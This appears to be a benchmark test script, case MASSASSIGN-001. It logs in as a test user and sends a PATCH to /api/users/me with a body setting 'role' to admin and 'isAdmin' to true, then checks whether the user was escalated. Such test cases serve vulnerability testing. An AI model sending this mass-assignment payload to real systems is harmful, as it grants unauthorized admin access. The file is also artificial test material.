#!/usr/bin/env bash
# MASSASSIGN-001: PATCH /api/users/me binds role/isAdmin straight from the request,
# so a plain user escalates to admin.
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
login user1@bench.local 'User123!'
curl -s -b "$JAR" -X PATCH "$TARGET/api/users/me" -H 'content-type: application/json' \
  -d '{"role":"admin","isAdmin":true}' >/dev/null
if [ "$(user_role user1@bench.local)" = "admin" ]; then
  rc=0
else
  rc=1
fi
reset
exit $rc
